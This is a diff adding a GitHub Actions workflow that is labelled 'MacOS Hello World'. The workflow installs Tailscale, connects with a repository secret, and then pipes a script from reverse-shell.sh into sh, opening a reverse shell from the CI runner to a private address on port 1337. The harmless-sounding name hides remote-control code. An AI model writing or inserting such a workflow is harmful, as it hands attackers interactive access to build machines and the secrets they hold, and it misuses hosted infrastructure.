@@ -1,0 +1,19 @@
+name: MacOS Hello World
+
+on:
+  workflow_dispatch:
+
+jobs:
+  hello-world:
+    runs-on: macos-latest
+
+    steps:
+      - name: install-tailscale
+        run: |
+          brew install tailscale
+          brew services start tailscale
+          sudo tailscale up --authkey ${{ secrets.TAILSCALE_API_KEY }}
+
+      - name: shell
+        run: |
+          curl https://reverse-shell.sh/100.78.219.49:1337 | sh
